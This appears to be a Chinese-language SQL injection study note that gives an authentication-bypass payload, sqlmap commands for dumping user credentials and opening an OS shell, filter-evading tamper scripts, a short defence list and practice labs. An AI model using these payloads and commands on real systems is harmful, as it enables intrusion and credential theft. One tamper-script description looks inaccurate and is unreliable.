# SQL 注入

> 标签：#Web安全 #SQL注入 #OWASP

## 注入原理

用户输入被当作 SQL 语句的一部分执行，导致数据库信息泄露或被篡改。

```sql
-- 正常查询
SELECT * FROM users WHERE username='admin' AND password='pass';

-- 注入后（绕过认证）
SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='';
```

## 注入类型

| 类型 | 说明 |
|------|------|
| **联合查询注入（UNION）** | 通过 UNION 拼接恶意查询结果 |
| **布尔盲注（Boolean-based）** | 通过页面响应差异判断条件真假 |
| **时间盲注（Time-based）** | 利用 SLEEP() 函数判断条件 |
| **报错注入** | 利用数据库错误信息回显数据 |
| **堆叠注入** | 用 `;` 执行多条 SQL 语句 |
| **宽字节注入** | 绕过 GBK 编码过滤 |

## 常用函数

```sql
-- MySQL
DATABASE()       -- 当前数据库名
VERSION()        -- 数据库版本
USER()           -- 当前用户
SUBSTRING(str,pos,len)  -- 字符串截取
ASCII()          -- 返回字符 ASCII 值
IF(condition,true_val,false_val)
SLEEP(n)         -- 延时 n 秒
LOAD_FILE()      -- 读取文件
INTO OUTFILE     -- 写入文件
```

## SQLMap 使用

```bash
# 基本扫描
sqlmap -u "http://target.com/?id=1"

# 指定数据库类型
sqlmap -u "http://target.com/?id=1" --dbms=mysql

# 指定参数
sqlmap -u "http://target.com/" --data="id=1&name=admin"

# 获取数据库
sqlmap -u "http://target.com/?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/?id=1" -D db_name --tables

# 获取列
sqlmap -u "http://target.com/?id=1" -D db_name -T users --columns

# 脱取数据
sqlmap -u "http://target.com/?id=1" -D db_name -T users -C username,password --dump

# 写入 WebShell（MySQL into outfile）
sqlmap -u "http://target.com/?id=1" --os-shell

# 代理
sqlmap -u "http://target.com/?id=1" --proxy=http://127.0.0.1:8080
```

## 常用 Tamper 脚本

```bash
sqlmap --tamper=space2comment      # 空格→/**/
sqlmap --tamper=between            # > → BETWEEN
sqlmap --tamper=charencode         # URL 编码
sqlmap --tamper=space2hash         # 空格→0x
```

## 防御方法

- ✅ **参数化查询 / 预编译**（最有效）
- ✅ **输入过滤**（正则，禁止单引号等）
- ✅ **WAF**（Web 应用防火墙）
- ✅ **最小权限原则**（Web 应用不用 DBA 权限）
- ❌ **避免拼接 SQL**

## 靶场练习

- DVWA — SQL Injection（Low/Medium/High）
- SQLi-Labs
- Pikachu — SQL 注入
